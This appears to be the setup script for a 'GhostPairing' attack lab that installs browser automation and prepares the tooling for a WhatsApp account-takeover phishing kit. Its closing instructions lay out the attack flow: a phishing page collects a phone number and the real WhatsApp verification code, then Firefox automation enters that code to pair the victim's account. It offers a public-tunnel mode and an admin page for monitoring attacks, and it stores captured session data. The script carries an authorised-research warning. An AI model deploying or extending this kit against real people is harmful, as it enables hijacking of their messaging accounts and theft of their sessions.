#!/bin/bash
set -euo pipefail

readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "========================================"
echo "  GHOSTPAIRING ATTACK LAB SETUP"
echo "      WITH BROWSER AUTOMATION"
echo "========================================"
echo ""

# Check for Python3
if ! command -v python3 &> /dev/null; then
    echo "[✗] Python3 is not installed"
    echo "[i] Install with: sudo apt-get install python3 python3-pip python3-venv"
    exit 1
fi

# Check Python version (need 3.8+)
PYTHON_VERSION=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
PYTHON_MAJOR=$(echo "${PYTHON_VERSION}" | cut -d. -f1)
PYTHON_MINOR=$(echo "${PYTHON_VERSION}" | cut -d. -f2)

if [[ "${PYTHON_MAJOR}" -lt 3 ]] || { [[ "${PYTHON_MAJOR}" -eq 3 ]] && [[ "${PYTHON_MINOR}" -lt 8 ]]; }; then
    echo "[✗] Python 3.8+ is required (found ${PYTHON_VERSION})"
    exit 1
fi

echo "[✓] Python ${PYTHON_VERSION} detected"

# Check for pip
if ! command -v pip3 &> /dev/null && ! python3 -m pip --version &> /dev/null; then
    echo "[✗] pip is not installed"
    echo "[i] Install with: sudo apt-get install python3-pip"
    exit 1
fi

# Determine pip command
if command -v pip3 &> /dev/null; then
    PIP_CMD="pip3"
else
    PIP_CMD="python3 -m pip"
fi

# Check for Firefox (required for automation)
if ! command -v firefox &> /dev/null; then
    echo "[!] Firefox is not installed"
    echo "[i] Install with: sudo apt-get install firefox"
    echo "[i] Or install manually from https://www.mozilla.org/firefox/"
    read -p "Continue without Firefox? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
    echo "[!] Warning: Browser automation will not work without Firefox"
fi

# Create virtual environment
echo "[1/7] Setting up Python virtual environment..."
if [[ ! -d "venv" ]]; then
    python3 -m venv venv
    echo "[✓] Virtual environment created"
else
    echo "[i] Virtual environment already exists"
fi

# Activate virtual environment
source venv/bin/activate

# Upgrade pip
echo "[2/7] Upgrading pip..."
$PIP_CMD install --upgrade pip

# Install Python dependencies
echo "[3/7] Installing Python dependencies..."
if [[ -f "requirements.txt" ]]; then
    if $PIP_CMD install -r requirements.txt; then
        echo "[✓] Core dependencies installed"
    else
        echo "[✗] Failed to install dependencies"
        echo "[i] Check your internet connection and try again"
        exit 1
    fi
else
    echo "[✗] requirements.txt not found"
    exit 1
fi

# Install Playwright (browser automation)
echo "[4/7] Installing Playwright for browser automation..."
if $PIP_CMD install playwright; then
    echo "[✓] Playwright installed"
else
    echo "[✗] Failed to install Playwright"
    echo "[i] Browser automation will not work"
fi

# Install Firefox for Playwright
echo "[5/7] Installing Firefox browser for automation..."
if python3 -c "import playwright" 2>/dev/null; then
    echo "[i] Installing Firefox (this may take a few minutes)..."
    if python3 -m playwright install firefox 2>&1 | tail -20; then
        echo "[✓] Firefox installed for Playwright"

        # Playwright removes system firefox-esr during installation
        # Reinstall it to fix system firefox command
        echo "[i] Reinstalling system firefox-esr..."
        if sudo apt-get --reinstall install -y firefox-esr >/dev/null 2>&1; then
            echo "[✓] System firefox-esr restored"
        else
            echo "[!] Could not restore system firefox-esr (non-critical)"
        fi
    else
        echo "[!] Firefox installation had issues"
        echo "[i] Try manually: python3 -m playwright install --force firefox"
    fi
else
    echo "[!] Playwright not available, skipping browser installation"
fi

# Check for X11/display server (required for GUI browser)
echo "[6/7] Checking display server..."
DISPLAY_TYPE="${XDG_SESSION_TYPE:-unknown}"
if [[ -n "${DISPLAY:-}" ]] || [[ "$DISPLAY_TYPE" == "x11" ]] || [[ "$DISPLAY_TYPE" == "wayland" ]]; then
    echo "[✓] Display server detected: $DISPLAY_TYPE"
    echo "[i] Firefox will open in GUI mode"
else
    echo "[!] No display server detected"
    echo "[i] Running in headless mode (no GUI)"
    echo "[i] For GUI mode, ensure you have X11/Wayland running"
fi

# Make scripts executable
echo "[7/7] Making scripts executable..."
chmod +x run.sh setup.sh whatsapp_api.py server.py 2>/dev/null || true

# Fix ownership if running as root
if [[ $EUID -eq 0 ]]; then
    ACTUAL_USER="${SUDO_USER:-kali}"
    ACTUAL_GROUP=$(id -gn "$ACTUAL_USER" 2>/dev/null || echo "kali")
    chown -R "$ACTUAL_USER:$ACTUAL_GROUP" "." 2>/dev/null || true
fi
# Re-apply data directory permissions
chmod -R g+w logs databases sessions automation_queues 2>/dev/null || true
chmod g+s logs databases sessions automation_queues 2>/dev/null || true

# Initialize database
echo "[+] Initializing database..."
python3 << 'PYEOF'
from whatsapp_api import WhatsAppGhostAPI
api = WhatsAppGhostAPI()
print("[✓] Database initialized")
PYEOF

# Test automation
echo "[+] Testing automation setup..."
python3 << 'PYEOF'
try:
    import playwright
    print("[✓] Playwright imported successfully")
    
    # Test basic playwright functionality
    from playwright.sync_api import sync_playwright
    print("[✓] Playwright API available")
    
    # Try to check Firefox installation
    import subprocess
    result = subprocess.run(['which', 'firefox'], capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[✓] Firefox found at: {result.stdout.strip()}")
    else:
        print("[!] Firefox not found in PATH")
        
except ImportError as e:
    print("[✗] Playwright not installed properly")
    print(f"[i] Error: {e}")
except Exception as e:
    print(f"[!] Automation test had issues: {e}")
PYEOF

echo ""
echo "========================================"
echo "    SETUP COMPLETED SUCCESSFULLY"
echo "========================================"
echo ""
echo "🚀 NEXT STEPS:"
echo ""
echo "  1. Start the lab:"
echo "     ./run.sh"
echo ""
echo "  2. Choose mode:"
echo "     - Mode 1: Local with automation (RECOMMENDED)"
echo "     - Mode 2: MITMProxy + automation"
echo "     - Mode 3: Public tunnel (use with caution)"
echo ""
echo "  3. Test the attack flow:"
echo "     a. Open browser to http://localhost:8000"
echo "     b. Enter YOUR phone number (with country code)"
echo "     c. Firefox will open to web.whatsapp.com"
echo "     d. WhatsApp sends REAL code to your phone"
echo "     e. Enter code on phishing page"
echo "     f. Code auto-entered in Firefox → account paired"
echo ""
echo "📁 FILES CREATED:"
echo "  📁 automation_queues/ - Browser automation queues"
echo "  📁 databases/        - Attack logs and session data"
echo "  📁 logs/            - Server and automation logs"
echo "  📁 sessions/        - Captured session data"
echo "  📄 server.py        - Main server with automation"
echo "  📄 whatsapp_api.py  - WhatsApp API with browser automation"
echo "  📄 run.sh           - Launcher script with automation modes"
echo ""
echo "⚠️  CRITICAL WARNINGS:"
echo ""
echo "  • ONLY test with phone numbers YOU OWN"
echo "  • Browser automation opens REAL Firefox to REAL web.whatsapp.com"
echo "  • WhatsApp will send REAL verification codes to the victim's phone"
echo "  • This is REAL account pairing - use responsibly!"
echo "  • FOR AUTHORIZED SECURITY RESEARCH ONLY"
echo ""
echo "🔧 TROUBLESHOOTING:"
echo ""
echo "  If Firefox doesn't open:"
echo "    • Check DISPLAY environment variable"
echo "    • Install X11 server if on headless system"
echo "    • Use: export DISPLAY=:0"
echo ""
echo "  If automation fails:"
echo "    • Reinstall playwright: pip install --upgrade playwright"
echo "    • Reinstall browsers: python3 -m playwright install --force firefox"
echo ""
echo "📊 Monitor attacks at: http://localhost:8000/admin"
echo ""
